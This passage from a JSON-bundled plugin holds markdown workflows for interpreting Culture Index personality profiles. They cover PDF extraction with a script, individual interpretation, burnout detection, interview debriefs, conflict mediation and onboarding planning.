adjustment\n\n**<70% (FRUSTRATION):**\n\n- Work doesn't fit their traits\n- May have lots to do, but work doesn't match who they are\n- Not punching eject yet, but getting close\n- Flight risk if not addressed\n\n</stress_types>\n\n<anti_patterns>\n\nAvoid these burnout detection mistakes:\n\n- **Ignoring small EU differences**: Even 10-15% over 130% matters\n- **Focusing only on EU**: Trait movement matters too\n- **Dismissing \"good stress\"**: Self-induced stress still causes burnout\n- **Using stale data**: Job behaviors should be resurveyed every 6 months\n- **Not asking why**: Understand the source before recommending solutions\n\n</anti_patterns>\n\n<success_criteria>\n\nBurnout detection is complete when:\n- [ ] Both Survey and Job data analyzed\n- [ ] EU utilization calculated\n- [ ] Arrow movement identified\n- [ ] All trait movements documented\n- [ ] Polarizing shifts flagged\n- [ ] Risk level assigned (Low/Moderate/High/Critical)\n- [ ] Stress sources identified\n- [ ] Specific recommendations provided\n- [ ] Timeline/horizon assessed\n\n</success_criteria>\n",
        "plugins/culture-index/skills/interpreting-culture-index/workflows/extract-from-pdf.md": "# Extract from PDF Workflow\n\nExtract Culture Index profile data from a PDF file and convert to JSON format.\n\n## Prerequisites\n\n**Required:**\n- `uv` - Install with `brew install uv` or `pip install uv`\n- `poppler` - Install with `brew install poppler` (macOS) or `apt install poppler-utils` (Ubuntu)\n- `tesseract` - Install with `brew install tesseract` (macOS) or `apt install tesseract-ocr` (Ubuntu)\n\n## Extraction Command\n\nSingle command, no setup required:\n\n```bash\nuv run {baseDir}/scripts/extract_pdf.py --verify /path/to/profile.pdf\n```\n\n**Options:**\n- `--verify`, `-v` - Show verification summary for spot-checking (recommended)\n- Second argument - Output path for JSON (optional, defaults to stdout)\n\n**Examples:**\n```bash\n# Extract with verification (recommended)\nuv run {baseDir}/scripts/extract_pdf.py --verify profile.pdf\n\n# Extract and save to file\nuv run {baseDir}/scripts/extract_pdf.py profile.pdf output.json\n\n# Extract and pipe to jq\nuv run {baseDir}/scripts/extract_pdf.py profile.pdf | jq '.survey'\n```\n\n## What Happens\n\n1. `uv` creates a temporary environment with all Python dependencies (PEP 723)\n2. Script extracts trait values using OpenCV (100% accuracy)\n3. With `--verify`, displays summary table for manual confirmation\n4. Outputs JSON to stdout or specified file\n\n## Verification Summary\n\nWhen using `--verify`, you'll see ASCII charts that match the PDF layout:\n\n```\n============================================================\nVERIFICATION SUMMARY - Compare with PDF\n============================================================\nName: Sara Davis\nPattern: Specialist\n\nSurvey Traits (EU=18)\n        0   1   2   3   4   5   6   7   8   9  10\n    A                                              [1]\n    B                                              [1]\n    C                                              [1]\n    D                                              [2]\n    L                                              [8]\n    I                                              [1]\n                                                   arrow (1.3)\n\nJob Behaviors (EU=26)\n        0   1   2   3   4   5   6   7   8   9  10\n    A                                              [1]\n    B                                              [2]\n    C                                              [4]\n    D                                              [5]\n    L                                              [3]\n    I                                              [4]\n                                                   arrow (3.0)\n\nEnergy Utilization: 144% ( STRESS)\n============================================================\n```\n\n**Spot-check against the PDF:**\n- Each trait row: Is the  in roughly the same position as the dot on the PDF?\n- Arrow position: Does  align with the red arrow on each chart?\n- EU values: Match what's displayed on the PDF?\n\n## If Extraction Fails\n\n- **\"uv not found\"**  Install uv: `brew install uv`\n- **\"poppler not found\"**  Install poppler: `brew install poppler`\n- **\"tesseract not found\"**  Install tesseract: `brew install tesseract`\n\n**Do NOT fall back to visual estimation.** Fix the dependency issue instead. Visual estimation has 20-30% error rate.\n\n## Output Format\n\n```json\n{\n  \"name\": \"Person Name\",\n  \"archetype\": \"Architect\",\n  \"header\": { ... },\n  \"survey\": {\n    \"eu\": 21,\n    \"arrow\": 2.3,\n    \"a\": [5, 2.7],      // [absolute, relative_to_arrow]\n    \"b\": [0, -2.3],\n    \"c\": [1, -1.3],\n    \"d\": [3, 0.7],\n    \"logic\": [5, null],\n    \"ingenuity\": [2, null]\n  },\n  \"job\": { ... },\n  \"analysis\": {\n    \"energy_utilization\": 148,\n    \"status\": \"stress\"\n  }\n}\n```\n\n## After Extraction\n\nProceed to the appropriate workflow:\n- Individual interpretation: `workflows/interpret-individual.md`\n- Burnout detection: `workflows/detect-burnout.md`\n- Team analysis: `workflows/analyze-team.md`\n",
        "plugins/culture-index/skills/interpreting-culture-index/workflows/interpret-individual.md": "<required_reading>\n\n**Read these reference files before interpreting:**\n1. `references/primary-traits.md` - A, B, C, D trait details\n2. `references/secondary-traits.md` - EU, L, I traits\n3. `references/patterns-archetypes.md` - Pattern identification\n\n</required_reading>\n\n<process>\n\n**Step 1: Load the Profile**\n\nFor JSON:\n```python\nimport json\nwith open(\"path/to/profile.json\") as f:\n    profile = json.load(f)\n```\n\nFor PDF: **Extract first** using the extraction script:\n```bash\nuv run {baseDir}/scripts/extract_pdf.py --verify /path/to/profile.pdf\n```\n\n **NEVER use visual estimation for trait values.** Visual estimation has 20-30% error rate.\n\n**Step 1b: Verify Extraction (if from PDF)**\n\nAfter extraction, review the verification summary and briefly spot-check against the PDF image:\n- [ ] EU values match what's displayed on each chart\n- [ ] Arrow position looks correct\n- [ ] Most extreme trait (shown in summary) makes visual sense\n\nIf any value seems wrong, re-run extraction or report the discrepancy.\n\n**Step 2: Identify Arrow Position**\n\nThe red vertical arrow is the population mean (50th percentile). Record its position on the 0-10 scale for both Survey and Job charts.\n\n**Step 3: Calculate Trait Distances**\n\nFor each trait (A, B, C, D), calculate distance from arrow:\n\n| Trait | Absolute Value | Arrow | Distance | Interpretation |\n|-------|---------------|-------|----------|----------------|\n| A | ? | ? | ? | (will fill) |\n| B | ? | ? | ? | |\n| C | ? | ? | ? | |\n| D | ? | ? | ? | |\n\n**Distance interpretation:**\n- 0 to 0.5: Normative (flexible)\n- 1 to 1.5: Tendency (moderate)\n- 2 to 3: Pronounced (noticeable)\n- 4+: Extreme (compulsive)\n\n**Step 4: Identify Leading Dots**\n\nFind the dots farthest from the arrow. These drive behavior most strongly.\n\nRank by distance (most extreme first):\n1. [Trait] at X centiles\n2. [Trait] at X centiles\n3. [Trait] at X centiles\n\n**Step 5: Identify Pattern/Archetype**\n\nCross-reference with `references/patterns-archetypes.md`.\n\nCommon patterns:\n- **Architect/Visionary**: High A, Low C, Low D\n- **Rainmaker/Persuader**: High A, High B, Low C\n- **Scholar/Specialist**: Low B, High C, High D\n- **Technical Expert**: Low A, Low B, Low C, High D\n- **Craftsman**: Low A, Low B, High C, High D\n\n**Step 6: Note L and I (Absolute Values)**\n\nThese use absolute interpretation, not distance from arrow:\n\n| Trait | Score | Interpretation |\n|-------|-------|----------------|\n| Logic | 0-2: Low (emotional) | 3-7: Normative | 8-10: High (rational) |\n| Ingenuity | 0-2: Low (practical) | 3-6: Occasional | 7-10: High (inventive) |\n\n**Step 7: Summarize Strengths**\n\nBased on leading dots, identify 2-3 key strengths:\n\nFor High A: Initiative, self-confidence, strategic thinking\nFor High B: Relationship building, influence, verbal communication\nFor High C: Patience, focus, consistency, methodical approach\nFor High D: Precision, reliability, quality control, accountability\nFor Low A: Team orientation, service mindset, execution\nFor Low B: Focus, analytical depth, independence\nFor Low C: Urgency, multitasking, adaptability\nFor Low D: Flexibility, big-picture thinking, risk tolerance\n\n**Step 8: Identify Challenges**\n\nBased on leading dots, note 2-3 potential challenges:\n\nFor High A: Difficulty with people, impatience with others, \"me first\" tendency\nFor High B: May prioritize relationships over results, needs social interaction\nFor High C: May resist change, slow to pivot, needs advance notice\nFor High D: May be inflexible, perfectionist, struggle to delegate\nFor Low A: May lack initiative, need clear direction, conflict avoidant\nFor Low B: May seem cold or disengaged, prefers solitude\nFor Low C: May create unnecessary urgency, interrupt others, prone to errors\nFor Low D: May miss details, inconsistent follow-through, forgetful\n\n**Step 9: Check Survey vs Job**\n\nIf both graphs available, compare:\n- Which dots moved significantly?\n- Did arrow shift (stress/frustration signal)?\n- Calculate EU utilization: (Job EU / Survey EU)  100\n\n**Step 10: Compile Summary**\n\nStructure your interpretation:\n\n```\n## [Name] - [Archetype]\n\n### Key Traits\n- [Leading trait 1]: [interpretation]\n- [Leading trait 2]: [interpretation]\n- [Leading trait 3]: [interpretation]\n\n### Strengths\n1. [Strength 1]\n2. [Strength 2]\n3. [Strength 3]\n\n### Development Areas\n1. [Challenge 1]\n2. [Challenge 2]\n\n### Energy Status\n- Survey EU: [X]\n- Job EU: [X]\n- Utilization: [X]% ([healthy/stress/frustration])\n\n### Recommendations\n- [Actionable recommendation 1]\n- [Actionable recommendation 2]\n```\n\n</process>\n\n<anti_patterns>\n\nAvoid these interpretation mistakes:\n\n- **Stating absolute values without context**: Never say \"A is 8\" without relating to arrow\n- **Comparing between people using absolutes**: \"Person A has higher B than Person B\"\n- **Value judgments**: Calling traits \"good\" or \"bad\"\n- **Over-indexing on single traits**: The pattern matters more than individual dots\n- **Ignoring Survey vs Job comparison**: Missing burnout signals\n- **Treating as definitive**: Culture Index is one data point, not complete truth\n\n</anti_patterns>\n\n<success_criteria>\n\nIndividual interpretation is complete when:\n- [ ] Data extracted using script (NOT visual estimation) if from PDF\n- [ ] Verification summary spot-checked against PDF (if from PDF)\n- [ ] Arrow position identified for both charts (if available)\n- [ ] All trait distances calculated relative to arrow\n- [ ] Leading dots identified and ranked\n- [ ] Pattern/archetype named\n- [ ] L and I interpreted using absolute values\n- [ ] 2-3 strengths documented\n- [ ] 2-3 challenges documented\n- [ ] Survey vs Job compared (if available)\n- [ ] EU utilization calculated (if both charts available)\n- [ ] Actionable recommendations provided\n- [ ] No absolute value comparisons used\n\n</success_criteria>\n",
        "plugins/culture-index/skills/interpreting-culture-index/workflows/interview-debrief.md": "<required_reading>\n\n**Read these reference files before debrief:**\n1. `references/patterns-archetypes.md` - Pattern identification and role fit\n2. `references/team-composition.md` - Gas/Brake/Glue framework\n3. `workflows/predict-from-interview.md` - How predictions were generated\n4. `workflows/define-hiring-profile.md` - If hiring profile exists\n\n</required_reading>\n\n<purpose>\n\nEvaluate a candidate's predicted Culture Index profile against role requirements and team composition. This workflow helps make informed hiring decisions using transcript-predicted traits, with appropriate caveats about prediction confidence.\n\n**Important:** This uses PREDICTED traits from interview analysis, not actual CI survey results. The actual survey will be administered after offer acceptance. Use this for preliminary assessment only.\n\n</purpose>\n\n<process>\n\n**Step 1: Load Predicted Profile**\n\nGather the prediction from transcript analysis:\n\n```\nCandidate: [Name]\nAnalysis Date: [Date]\nInterview Source: [Interview type, duration]\n\nPredicted Traits:\n| Trait | Predicted | Confidence | Key Evidence |\n|-------|-----------|------------|--------------|\n| A | [High/Low/Norm] | [H/M/L] | \"[Quote]\" |\n| B | [High/Low/Norm] | [H/M/L] | \"[Quote]\" |\n| C | [High/Low/Norm] | [H/M/L] | \"[Quote]\" |\n| D | [High/Low/Norm] | [H/M/L] | \"[Quote]\" |\n| L | [0-10] | [H/M/L] | \"[Quote]\" |\n| I | [0-10] | [H/M/L] | \"[Quote]\" |\n\nPredicted Pattern: [Pattern name]\nOverall Confidence: [High/Medium/Low]\n```\n\n**Step 2: Load Role Requirements**\n\nIf a hiring profile exists, load it. Otherwise, answer the role-fit questions:\n\n| Question | Answer | Required Trait |\n|----------|--------|----------------|\n| Macro or micro? | [answer] | A: [High/Low/Norm] |\n| People or problems? | [answer] | B: [High/Low/Norm] |\n| Repetition level? | [answer] | C: [High/Low/Norm] |\n| Process adherence? | [answer] | D: [High/Low/Norm] |\n\n**Target Pattern:** [Pattern name]\n**Red Flags for Role:** [traits that would struggle]\n\n**Step 3: Compare Predicted vs Required**\n\n| Trait | Predicted | Required | Match | Notes |\n|-------|-----------|----------|-------|-------|\n| A | [pred] | [req] | [Y/N/~] | [concern if any] |\n| B | [pred] | [req] | [Y/N/~] | [concern if any] |\n| C | [pred] | [req] | [Y/N/~] | [concern if any] |\n| D | [pred] | [req] | [Y/N/~] | [concern if any] |\n| L | [pred] | [req] | [Y/N/~] | [concern if any] |\n| I | [pred] | [req] | [Y/N/~] | [concern if any] |\n\n**Match key:**\n- Y = Strong match (same direction, similar magnitude)\n- ~ = Acceptable (within tolerance)\n- N = Mismatch (opposite direction or extreme gap)\n\n**Step 4: Check Against Red Flags**\n\nCompare predicted traits to role red flags:\n\n| Red Flag | Predicted | Hit? | Severity |\n|----------|-----------|------|----------|\n| [trait/pattern] | [prediction] | [Y/N] | [High/Med/Low] |\n\n**Red flag hits:** [count]\n\n**Step 5: Assess Team Fit**\n\nIf team profiles are available:\n\n**Current Team Composition:**\n- Gas (High A): [count] people\n- Brake (High D): [count] people\n- Glue (High B): [count] people\n\n**Would this candidate add:**\n- [ ] Needed Gas (High A)?\n- [ ] Needed Brake (High D)?\n- [ ] Needed Glue (High B)?\n- [ ] Diversity of perspective?\n\n**Potential team friction:**\n- [Candidate trait] vs [Team member trait]: [friction risk]\n\n**Step 6: Assess Manager Fit**\n\nIf hiring manager's profile is known:\n\n| Trait | Manager | Candidate (Predicted) | Gap |\n|-------|---------|----------------------|-----|\n| A | [pos] | [pred] | [diff] |\n| B | [pos] | [pred] | [diff] |\n| C | [pos] | [pred] | [diff] |\n| D | [pos] | [pred] | [diff] |\n\n**Predicted working relationship:**\n- [Alignment or friction point 1]\n- [Alignment or friction point 2]\n\n**Step 7: Weight Confidence Levels**\n\nCalculate weighted assessment based on prediction confidence:\n\n| Factor | Assessment | Confidence Weight | Weighted |\n|--------|------------|-------------------|----------|\n| Role fit | [Strong/Moderate/Weak] | [H/M/L  3/2/1] | [score] |\n| Team fit | [Strong/Moderate/Weak] | [H/M/L  3/2/1] | [score] |\n| Red flag hits | [None/Some/Multiple] | [H/M/L  3/2/1] | [score] |\n| Manager fit | [Strong/Moderate/Weak] | [H/M/L  3/2/1] | [score] |\n\n**Important confidence caveats:**\n- Low confidence traits: May change significantly when actual CI is administered\n- Medium confidence: Directionally correct but magnitude uncertain\n- High confidence: Likely accurate, but interview stress may have affected\n\n**Step 8: Generate Recommendation**\n\nBased on weighted assessment:\n\n| Overall Fit | Recommendation | Action |\n|-------------|----------------|--------|\n| Strong fit, high confidence | **Proceed** | Extend offer, plan for CI survey |\n| Strong fit, low confidence | **Proceed with note** | Extend offer, flag traits to verify |\n| Moderate fit | **Proceed with awareness** | Extend offer, prepare for onboarding adjustments |\n| Weak fit, concerns | **Discuss** | Review concerns with hiring team |\n| Red flag hits | **Pause** | Additional interviews or reconsider |\n\n**Step 9: Compile Debrief Summary**\n\n```markdown\n## Interview Debrief: [Candidate Name]\n\n**Date:** [Date]\n**Role:** [Position]\n**Prediction Source:** [Interview type, duration]\n**Overall Prediction Confidence:** [High/Medium/Low]\n\n### Predicted Profile Summary\n| Trait | Predicted | Confidence |\n|-------|-----------|------------|\n| A | [pos] | [H/M/L] |\n| B | [pos] | [H/M/L] |\n| C | [pos] | [H/M/L] |\n| D | [pos] | [H/M/L] |\n\n**Predicted Pattern:** [Pattern]\n\n### Fit Assessment\n\n**Role Fit:** [Strong/Moderate/Weak]\n- [Key alignment or concern]\n\n**Team Fit:** [Strong/Moderate/Weak]\n- [Key alignment or concern]\n\n**Manager Fit:** [Strong/Moderate/Weak]\n- [Key alignment or concern]\n\n### Red Flags\n- [Red flag 1, if any]\n- [Red flag 2, if any]\n\n### Recommendation\n**[Proceed / Proceed with Note / Discuss / Pause]**\n\n[1-2 sentence rationale]\n\n### Areas to Verify with Actual CI\nWhen the actual Culture Index survey is administered (after offer acceptance), verify:\n1. [Trait with lower confidence]\n2. [Trait that's critical for role]\n3. [Any predicted trait that was borderline]\n\n### If Hired: Onboarding Considerations\nBased on predicted profile:\n- [Onboarding consideration 1]\n- [Onboarding consideration 2]\n\n### Caveats\n- This assessment uses predicted traits from interview analysis\n- Interview behavior may differ from natural behavior\n- Actual CI survey will be sent after offer acceptance\n- Predictions should inform, not determine, hiring decisions\n- Technical skills, experience, and cultural interview still matter\n```\n\n</process>\n\n<anti_patterns>\n\nAvoid these debrief mistakes:\n\n- **Treating predictions as facts**: Low confidence predictions may be wrong\n- **Over-weighting CI fit**: Skills, experience, and culture interview matter too\n- **Automatic rejection on red flags**: Consider severity and role criticality\n- **Ignoring interview performance**: CI predicts drives, not capabilities\n- **Comparing to non-existent ideal**: No candidate is a perfect match\n- **Forgetting the actual survey is coming**: Use predictions for preliminary assessment only\n\n</anti_patterns>\n\n<success_criteria>\n\nInterview debrief is complete when:\n- [ ] Predicted profile loaded with confidence levels\n- [ ] Role requirements documented (from hiring profile or role-fit questions)\n- [ ] Predicted vs required comparison completed\n- [ ] Red flags checked\n- [ ] Team fit assessed (if team data available)\n- [ ] Manager fit assessed (if manager profile available)\n- [ ] Confidence weighting applied\n- [ ] Clear recommendation generated\n- [ ] Areas to verify with actual CI identified\n- [ ] Onboarding considerations noted\n- [ ] Caveats about prediction limitations included\n\n</success_criteria>\n",
        "plugins/culture-index/skills/interpreting-culture-index/workflows/mediate-conflict.md": "<required_reading>\n\n**Read these reference files before mediation:**\n1. `references/primary-traits.md` - A, B, C, D trait details\n2. `references/team-composition.md` - Conflict pairs and friction patterns\n3. `references/patterns-archetypes.md` - Pattern identification\n\n</required_reading>\n\n<purpose>\n\nUnderstand why two team members aren't working well together using their Culture Index profiles. This workflow identifies trait-based friction sources and provides specific recommendations for improving the working relationship.\n\n**Important:** CI explains behavioral friction, not personal conflict. If the conflict involves values, ethics, or performance issues, those require separate intervention.\n\n</purpose>\n\n<process>\n\n**Step 1: Load Both Profiles**\n\n```\nPerson A: [Name]\n- Role: [Title]\n- Pattern: [Archetype]\n- A: [position relative to arrow]\n- B: [position relative to arrow]\n- C: [position relative to arrow]\n- D: [position relative to arrow]\n- EU Survey/Job: [values]\n\nPerson B: [Name]\n- Role: [Title]\n- Pattern: [Archetype]\n- A: [position relative to arrow]\n- B: [position relative to arrow]\n- C: [position relative to arrow]\n- D: [position relative to arrow]\n- EU Survey/Job: [values]\n```\n\n**Step 2: Map Trait Differences**\n\nCalculate the gap for each trait:\n\n| Trait | Person A | Person B | Gap | On Same Side? |\n|-------|----------|----------|-----|---------------|\n| A | [pos] | [pos] | [diff] | [Yes/No] |\n| B | [pos] | [pos] | [diff] | [Yes/No] |\n| C | [pos] | [pos] | [diff] | [Yes/No] |\n| D | [pos] | [pos] | [diff] | [Yes/No] |\n\n**Highest friction risk:** Traits on opposite sides of arrow with large gaps.\n\n**Step 3: Identify Primary Friction Source**\n\nMatch trait gaps to known friction patterns:\n\n| Pattern | Source | How It Manifests |\n|---------|--------|------------------|\n| **High A vs Low A** | Independence vs collaboration | High A acts autonomously; Low A feels excluded. Low A seeks consensus; High A sees it as slow. |\n| **High A vs High A** | Power struggle | Both want to lead, neither wants to defer. Competing visions. |\n| **High B vs Low B** | Social energy mismatch | High B wants connection; Low B wants focus. High B feels rejected; Low B feels overwhelmed. |\n| **High C vs Low C** | Pace mismatch | Low C creates urgency; High C resists rush. High C seems slow; Low C seems chaotic. |\n| **High D vs Low D** | Detail orientation | High D focuses on precision; Low D on big picture. High D sees carelessness; Low D sees rigidity. |\n| **High D vs High D** | Perfectionism clash | Both critical, both notice flaws. Can become mutual criticism spiral. |\n\n**Your primary friction source:** [Identified pattern]\n\n**Step 4: Understand Each Perspective**\n\nMap how each person likely perceives the other:\n\n**Person A ([Pattern]) likely sees Person B as:**\n\n| Person A's Trait | Person B's Trait | Person A Perceives B As... |\n|------------------|------------------|---------------------------|\n| High A | Low A | Indecisive, slow, passive |\n| Low A | High A | Aggressive, selfish, dismissive |\n| High B | Low B | Cold, unfriendly, disconnected |\n| Low B | High B | Chatty, distracting, inefficient |\n| High C | Low C | Chaotic, impatient, disruptive |\n| Low C | High C | Slow, resistant, inflexible |\n| High D | Low D | Sloppy, unreliable, careless |\n| Low D | High D | Rigid, nitpicky, controlling |\n\n**Person B ([Pattern]) likely sees Person A as:**\n[Same analysis from B's perspective]\n\n**Step 5: Assess Relationship Structure**\n\nWhat is their working relationship?\n\n| Relationship | Additional Dynamics |\n|--------------|---------------------|\n| Peers | No hierarchy - must find middle ground |\n| Manager  Report | Manager should adapt first (they have more power) |\n| Report  Manager | Report may need environment change if mismatch is severe |\n| Cross-functional | Different priorities compound trait friction |\n| Close collaborators | Daily friction accumulates faster |\n| Occasional interaction | May be able to limit contact |\n\n**Their relationship:** [Type]\n\n**Step 6: Generate Mediation Approach**\n\nBased on friction source, recommend approach:\n\n**For High A vs Low A friction:**\n- Clarify decision rights (who owns what)\n- High A: Give Low A explicit input time before decisions\n- Low A: Understand High A's autonomy need isn't personal\n- Process: Defined consultation points before independent action\n\n**For High B vs Low B friction:**\n- Acknowledge different social needs\n- High B: Reduce expectations for social interaction from Low B\n- Low B: Commit to minimal connection (brief check-ins)\n- Process: Scheduled, bounded social interaction\n\n**For High C vs Low C friction:**\n- Acknowledge pace difference as legitimate\n- Low C: Give advance notice of urgent requests\n- High C: Accept some urgency is real, build buffer time\n- Process: Deadlines set with High C's processing time in mind\n\n**For High D vs Low D friction:**\n- Acknowledge different detail orientations\n- High D: Accept \"good enough\" for some work\n- Low D: Use systems to catch critical details\n- Process: Clear quality standards for each deliverable type\n\n**For High A vs High A friction:**\n- Clear domain ownership (separate turfs)\n- Explicit agreement on shared decisions\n- Regular alignment to prevent divergent directions\n- Process: Leadership defines who owns what\n\n**Your mediation approach:**\n1. [Specific recommendation]\n2. [Specific recommendation]\n3. [Specific recommendation]\n\n**Step 7: Design Process Changes**\n\nBeyond individual adjustments, what process changes would help?\n\n| Friction Source | Process Solution |\n|-----------------|------------------|\n| Pace mismatch | Define response time expectations, meeting cadence |\n| Decision friction | RACI or decision rights matrix |\n| Communication style | Agree on preferred channels, formats |\n| Detail orientation | Define quality gates and checklists |\n| Social needs | Protected focus time vs collaboration time |\n\n**Recommended process changes:**\n1. [Specific process change]\n2. [Specific process change]\n\n**Step 8: Identify What Won't Change**\n\nCI traits are hardwired. Set realistic expectations:\n\n| Person | Trait | Will Not Change |\n|--------|-------|-----------------|\n| [Name] | [trait] | [behavior that won't change] |\n| [Name] | [trait] | [behavior that won't change] |\n\n**Accept that:**\n- [Person A] will continue to [trait-driven behavior]\n- [Person B] will continue to [trait-driven behavior]\n\nThe goal is accommodation, not transformation.\n\n**Step 9: Check Energy Levels**\n\nReview EU utilization for both parties:\n\n| Person | EU Survey | EU Job | Utilization | Status |\n|--------|-----------|--------|-------------|--------|\n| [A] | [val] | [val] | [%] | [Healthy/Stress/Frustration] |\n| [B] | [val] | [val] | [%] | [Healthy/Stress/Frustration] |\n\n**If either is in stress/frustration:**\n- The conflict may be intensifying natural friction\n- Address the energy drain as part of mediation\n- Consider workload or role adjustment\n\n**Step 10: Compile Mediation Summary**\n\n```markdown\n## Conflict Analysis: [Person A] & [Person B]\n\n**Date:** [Date]\n**Relationship:** [Peers / Manager-Report / etc.]\n\n### Profile Comparison\n\n| Trait | Person A | Person B | Gap |\n|-------|----------|----------|-----|\n| A | [pos] | [pos] | [diff] |\n| B | [pos] | [pos] | [diff] |\n| C | [pos] | [pos] | [diff] |\n| D | [pos] | [pos] | [diff] |\n\n**Person A Pattern:** [Archetype]\n**Person B Pattern:** [Archetype]\n\n### Primary Friction Source\n**[Identified pattern]**\n\n[1-2 sentence explanation of the core conflict driver]\n\n### How They See Each Other\n\n**Person A likely perceives Person B as:**\n- [perception based on trait gap]\n\n**Person B likely perceives Person A as:**\n- [perception based on trait gap]\n\n### Recommendations\n\n**For Person A:**\n1. [Specific adjustment]\n2. [Specific adjustment]\n\n**For Person B:**\n1. [Specific adjustment]\n2. [Specific adjustment]\n\n**Process Changes:**\n1. [Process change to reduce friction]\n2. [Process change to reduce friction]\n\n### What Won't Change\n- [Person A] will continue to [trait behavior] - this is hardwired\n- [Person B] will continue to [trait behavior] - this is hardwired\n\nThe goal is accommodation, not transformation.\n\n### Energy Status\n- Person A: [EU utilization status]\n- Person B: [EU utilization status]\n\n[Note any energy concerns]\n\n### Conversation Guide\n\n**Frame the discussion as:**\n- Different working styles, not personal conflict\n- Both approaches are valid\n- Goal is finding workable middle ground\n\n**Avoid:**\n- Labeling either person's style as \"wrong\"\n- Expecting either to fundamentally change\n- Assuming one must adapt more than the other (unless manager-report)\n\n### Success Indicators\nAfter mediation, look for:\n- [ ] Reduced friction in [specific interaction type]\n- [ ] Both parties feeling heard\n- [ ] Workable process in place for [friction point]\n- [ ] Energy levels stabilizing (if previously stressed)\n\n### Escalation Criteria\nEscalate beyond CI-based mediation if:\n- Conflict involves values, ethics, or harassment\n- Performance issues underlie the conflict\n- Either party is unwilling to accommodate\n- Energy utilization continues declining\n```\n\n</process>\n\n<anti_patterns>\n\nAvoid these mediation mistakes:\n\n- **Blaming one party**: Both profiles contribute to friction\n- **Expecting transformation**: CI traits don't change - environment does\n- **Ignoring power dynamics**: Manager-report relationships require manager to adapt first\n- **Over-attributing to CI**: Not all conflict is trait-based\n- **Generic advice**: Recommendations must be specific to their trait gaps\n- **Forgetting EU signals**: Energy drain indicates escalating friction\n\n</anti_patterns>\n\n<success_criteria>\n\nConflict mediation is complete when:\n- [ ] Both profiles loaded and compared\n- [ ] All trait gaps calculated\n- [ ] Primary friction source identified\n- [ ] Each person's perspective mapped\n- [ ] Relationship structure considered\n- [ ] Specific recommendations for each person\n- [ ] Process changes identified\n- [ ] Hardwired behaviors acknowledged (won't change)\n- [ ] EU levels checked\n- [ ] Conversation guide provided\n- [ ] Success indicators defined\n- [ ] Escalation criteria noted\n\n</success_criteria>\n",
        "plugins/culture-index/skills/interpreting-culture-index/workflows/plan-onboarding.md": "<required_reading>\n\n**Read these reference files before planning onboarding:**\n1. `references/primary-traits.md` - A, B, C, D trait details and communication styles\n2. `references/team-composition.md` - Gas/Brake/Glue and conflict pairs\n3. `references/patterns-archetypes.md` - Pattern identification\n\n</required_reading>\n\n<purpose>\n\nPlan effective onboarding for a new hire using their Culture Index profile and the team's profiles. This workflow identifies likely allies, potential friction points, and provides specific recommendations for the first 90 days.\n\n**Context:** This workflow is typically used after the new hire has signed their offer and completed the CI survey, but before their start date.\n\n</purpose>\n\n<process>\n\n**Step 1: Load New Hire Profile**\n\n```\nNew Hire: [Name]\nStart Date: [Date]\nRole: [Title]\nReports To: [Manager name]\n\nProfile:\n- Pattern: [Archetype]\n- A: [position relative to arrow]\n- B: [position relative to arrow]\n- C: [position relative to arrow]\n- D: [position relative to arrow]\n- L: [absolute value]\n- I: [absolute value]\n- EU Survey: [value]\n```\n\n**If comparing to predicted profile (from interview):**\n| Trait | Predicted | Actual | Delta |\n|-------|-----------|--------|-------|\n| A | [pred] | [actual] | [diff] |\n| B | [pred] | [actual] | [diff] |\n| C | [pred] | [actual] | [diff] |\n| D | [pred] | [actual] | [diff] |\n\nNote any significant differences for onboarding planning.\n\n**Step 2: Load Team Profiles**\n\nList immediate team members:\n\n| Name | Pattern | A | B | C | D | Role |\n|------|---------|---|---|---|---|------|\n| [Manager] | [pattern] | [pos] | [pos] | [pos] | [pos] | Manager |\n| [Peer 1] | [pattern] | [pos] | [pos] | [pos] | [pos] | [role] |\n| [Peer 2] | [pattern] | [pos] | [pos] | [pos] | [pos] | [role] |\n\n**Team Composition:**\n- Gas (High A): [count] people\n- Brake (High D): [count] people\n- Glue (High B): [count] people\n\n**Step 3: Identify Natural Allies**\n\nFind team members with compatible profiles:\n\n**High compatibility indicators:**\n- Similar pattern/archetype\n- Similar B position (social energy match)\n- Similar C position (pace match)\n- Complementary traits (their strength helps their gap)\n\n| Team Member | Compatibility | Reason |\n|-------------|---------------|--------|\n| [Name] | High | [trait similarity or complement] |\n| [Name] | Medium | [partial match] |\n\n**Recommended buddy/mentor:**\n- Primary: [Name] - [reason for pairing]\n- Secondary: [Name] - [reason for backup]\n\n**Step 4: Flag Potential Friction Points**\n\nFind team members with opposite profiles:\n\n| Team Member | Friction Risk | Source | Mitigation |\n|-------------|---------------|--------|------------|\n| [Name] | High | [opposite trait] | [suggestion] |\n| [Name] | Medium | [gap] | [suggestion] |\n\n**Common friction sources:**\n- High A vs Low A: Independence vs collaboration expectations\n- High B vs Low B: Social needs mismatch\n- High C vs Low C: Pace/urgency mismatch\n- High D vs Low D: Detail orientation mismatch\n\n**Step 5: Manager Compatibility Assessment**\n\nCompare new hire to their manager:\n\n| Trait | Manager | New Hire | Gap | Adjustment Needed |\n|-------|---------|----------|-----|-------------------|\n| A | [pos] | [pos] | [diff] | [manager adjustment] |\n| B | [pos] | [pos] | [diff] | [manager adjustment] |\n| C | [pos] | [pos] | [diff] | [manager adjustment] |\n| D | [pos] | [pos] | [diff] | [manager adjustment] |\n\n**Manager coaching points:**\n- [Specific adjustment for this new hire]\n- [Specific adjustment for this new hire]\n\n**Step 6: Design First 30 Days**\n\nBased on new hire's profile:\n\n**Week 1 - Orientation:**\n\n| If New Hire Is... | Orientation Approach |\n|-------------------|---------------------|\n| High A | Give autonomy early, avoid over-managing, focus on outcomes |\n| Low A | Provide clear direction, structured intro, defined expectations |\n| High B | Introduce to team quickly, social activities, relationships first |\n| Low B | Gradual introductions, 1:1 over group, respect alone time |\n| High C | Predictable schedule, one thing at a time, advance notice |\n| Low C | Variety early, multiple projects, don't over-structure |\n| High D | Documented processes, clear SOPs, training materials |\n| Low D | Big picture context, creative problems, flexibility |\n\n**Your Week 1 approach:**\n- [Specific recommendation based on their traits]\n- [Specific recommendation based on their traits]\n- [Specific recommendation based on their traits]\n\n**Weeks 2-4 - Integration:**\n\n| Priority | Action | Why (based on profile) |\n|----------|--------|------------------------|\n| 1 | [action] | [trait-based reason] |\n| 2 | [action] | [trait-based reason] |\n| 3 | [action] | [trait-based reason] |\n\n**Step 7: Design 30-60 Days**\n\n| Focus Area | Approach for This Profile |\n|------------|---------------------------|\n| Feedback style | [Based on A and D traits] |\n| Meeting cadence | [Based on B and C traits] |\n| Project type | [Based on I and pattern] |\n| Independence level | [Based on A trait] |\n| Check-in format | [Based on B and C traits] |\n\n**Milestones to 